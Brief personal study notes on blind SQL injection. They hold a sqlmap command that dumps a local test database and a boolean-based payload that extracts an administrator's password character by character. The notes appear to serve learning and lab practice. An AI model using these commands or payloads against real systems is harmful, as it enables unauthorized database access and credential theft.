### N o T e S

---

```py
python sqlmap.py -u http://127.0.0.1/xxxxxxxxxx/fetch?id=1 --dump
```

---

Blind SQL is the SQLI where we don't get any errors or outputs of our SQL query from the database.

1. `UNION` attacks are not that affective.
2. `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm` : Use payloads and check for the outputs reflected on page.


